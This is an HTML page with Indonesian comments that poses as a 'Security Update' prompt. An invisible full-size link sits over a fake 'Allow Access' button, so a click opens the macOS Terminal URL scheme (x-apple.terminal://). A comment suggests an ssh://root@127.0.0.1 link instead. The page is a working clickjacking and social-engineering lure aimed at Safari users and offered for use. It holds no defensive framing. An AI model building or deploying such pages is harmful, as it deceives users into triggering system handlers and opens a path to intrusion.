<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f0f4f8;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .panel {
    background: #fff;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    text-align: center;
    position: relative;
  }
  h1 { color: #333; margin-bottom: 10px; }
  p { color: #666; margin-bottom: 20px; }
  
  /* Tombol Palsu (Hanya Visual) */
  .fake-btn {
    padding: 15px 30px;
    background: #007aff;
    color: #fff;
    border-radius: 8px;
    font-size: 18px;
    font-weight: bold;
    display: inline-block;
  }

  /* TAG <a> ASLI (Disembunyikan tapi menutupi tombol) */
  #trapLink {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0; /* Transparan */
    cursor: pointer;
    z-index: 10;
  }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Update</h1>
  <p>Klik tombol di bawah untuk mengizinkan akses.</p>
  
  <!-- Tombol Palsu -->
  <div class="fake-btn">Allow Access</div>

  <!-- Tag <a> Penjebak (Memicu Terminal) -->
  <!-- Target href langsung ke skema kustom -->
  <a href="x-apple.terminal://" id="trapLink">Trap</a>
</div>

<script>
  // Trik tambahan: Jika terminal tidak terbuka, coba skema SSH
  // (Anda bisa ganti href di atas menjadi ssh://root@127.0.0.1)
  
  document.getElementById('trapLink').addEventListener('click', function(e) {
    console.log("[!] Anchor diklik. Safari sedang memproses redirect...");
    // Tidak perlu preventDefault agar Safari memprosesnya secara native.
  });
</script>
</body>
</html>
